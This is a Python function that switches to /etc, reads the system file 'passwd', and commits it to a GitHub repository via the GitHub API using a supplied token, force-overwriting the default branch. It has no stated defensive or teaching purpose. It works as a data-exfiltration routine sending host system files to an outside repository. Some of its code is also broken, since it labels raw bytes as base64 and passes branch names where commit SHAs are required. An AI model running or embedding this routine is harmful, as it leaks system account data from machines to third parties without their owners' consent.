# Execute the command
def run(user, repo, token):

    # Execute the command
    import subprocess
    import os

    # Define the command
    #command = "cd /etc"

    #subprocess.run(command, shell=True)

    #os.system("cd /etc")
    os.chdir('/etc')

    print("Breakpoint 0")

    import requests

    print("Breakpoint 1")

    # Replace these variables with your own values
    repo_owner = user
    repo_name = repo
    file_path = 'passwd'  # The file you want to upload
    token = token

    # Create a session with your PAT
    session = requests.Session()
    session.headers.update({'Authorization': f'token {token}'})

    # Get the current repository's information
    url = f'https://api.github.com/repos/{repo_owner}/{repo_name}'
    response = session.get(url)
    if response.status_code != 200:
        print(f"Failed to get repository information: {response.status_code}")
        exit()

    print("Breakpoint 2")

    # Get the current default branch (e.g., 'main' or 'master')
    default_branch = response.json()['default_branch']

    # Create a new blob (file content)
    with open(file_path, 'rb') as file:
        file_content = file.read()
    blob_payload = {
        'content': file_content,
        'encoding': 'base64'
    }
    blob_url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/git/blobs'
    response = session.post(blob_url, json=blob_payload)
    if response.status_code != 201:
        print(f"Failed to create blob: {response.status_code}")
        exit()
    blob_sha = response.json()['sha']

    print("Breakpoint 3")

    # Create a new tree with the blob
    tree_payload = {
        'base_tree': default_branch,
        'tree': [
            {
                'path': file_path,
                'mode': '100644',
                'type': 'blob',
                'sha': blob_sha
            }
        ]
    }
    tree_url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/git/trees'
    response = session.post(tree_url, json=tree_payload)
    if response.status_code != 201:
        print(f"Failed to create tree: {response.status_code}")
        exit()
    tree_sha = response.json()['sha']

    print("Breakpoint 4")

    # Create a new commit
    commit_payload = {
        'message': 'Upload a file via Python in: ' + file_path,
        'tree': tree_sha,
        'parents': [default_branch],
    }
    commit_url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/git/commits'
    response = session.post(commit_url, json=commit_payload)
    if response.status_code != 201:
        print(f"Failed to create commit: {response.status_code}")
        exit()
    commit_sha = response.json()['sha']

    print("Breakpoint 5")

    # Update the reference (branch) to point to the new commit
    reference_payload = {
        'sha': commit_sha,
        'force': True
    }
    reference_url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/git/refs/heads/{default_branch}'
    response = session.patch(reference_url, json=reference_payload)
    if response.status_code != 200:
        print(f"Failed to update reference: {response.status_code}")
        exit()

    print(f"File '{file_path}' uploaded to GitHub repository '{repo_owner}/{repo_name}' successfully!")
